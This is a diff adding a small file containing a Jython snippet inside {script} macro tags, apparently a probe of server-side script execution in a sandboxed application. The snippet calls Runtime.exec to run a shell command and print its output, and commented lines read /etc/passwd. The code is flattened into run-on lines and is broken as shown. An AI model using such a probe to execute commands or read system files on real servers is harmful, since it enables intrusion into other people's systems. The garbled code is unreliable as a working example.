@@ -1,0 +1,11 @@
+mandbox
+{script} from java.lang import Runtime from java.lang import Process from
+java.io import BufferedReader from java.io import InputStreamReader
+
+try: rt = Runtime.getRuntime() cmd = "pwd" process = rt.exec(cmd) stdInput =
+BufferedReader(InputStreamReader(process.getInputStream())) s =
+stdInput.readLine() while(s): print s s = stdInput.readLine() except: print
+"damn"
+
+#f = open('/etc/passwd') #print f.read() #f.close() {script}
+
